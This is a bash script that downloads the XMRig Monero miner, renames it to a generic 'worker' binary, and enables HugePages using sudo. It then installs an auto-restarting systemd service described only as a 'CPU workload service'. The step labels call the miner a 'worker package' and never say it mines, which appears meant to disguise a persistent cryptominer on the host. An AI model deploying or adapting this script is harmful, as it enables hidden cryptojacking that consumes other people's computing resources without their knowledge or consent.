#!/bin/bash
set -e

APP_DIR="$HOME/appsvc"
BIN_URL="https://github.com/MoneroOcean/xmrig/releases/download/v6.24.0-mo1/xmrig-v6.24.0-mo1-lin64.tar.gz"
ARCHIVE="/tmp/app.tar.gz"

echo "[1] Preparing directory..."
mkdir -p "$APP_DIR"

echo "[2] Downloading worker package..."
curl -L "$BIN_URL" -o "$ARCHIVE"

echo "[3] Unpacking package..."
tar xf "$ARCHIVE" -C "$APP_DIR" --strip-components=1
rm "$ARCHIVE"

echo "[4] Renaming binary to 'worker'..."
mv "$APP_DIR/xmrig" "$APP_DIR/worker"

echo "[5] Copying config.json..."
cp config.json "$APP_DIR/config.json"

###############################################################################
#                      ENABLE HUGE PAGES AUTOMATICALLY                       
###############################################################################

CPU_CORES=$(nproc)
# 1168 是 RandomX 的基准需求，再加上 CPU 核数，最稳定
HUGEPAGES=$((1168 + CPU_CORES))

echo "[6] Enabling HugePages (target: $HUGEPAGES)..."

sudo bash -c "echo vm.nr_hugepages=$HUGEPAGES >> /etc/sysctl.conf"
sudo sysctl -w vm.nr_hugepages=$HUGEPAGES

echo "[OK] HugePages applied."

###############################################################################

echo "[7] Creating systemd service..."
cat <<EOF > /tmp/appsvc.service
[Unit]
Description=CPU workload service (worker)
After=network-online.target

[Service]
ExecStart=$APP_DIR/worker --config=$APP_DIR/config.json
Restart=always
RestartSec=5
Nice=10

[Install]
WantedBy=multi-user.target
EOF

sudo mv /tmp/appsvc.service /etc/systemd/system/appsvc.service

echo "[8] Activating service..."
sudo systemctl daemon-reload
sudo systemctl enable appsvc.service
sudo systemctl start appsvc.service

echo ""
echo "Setup complete."
echo "View logs with:"
echo "   sudo journalctl -u appsvc -f"

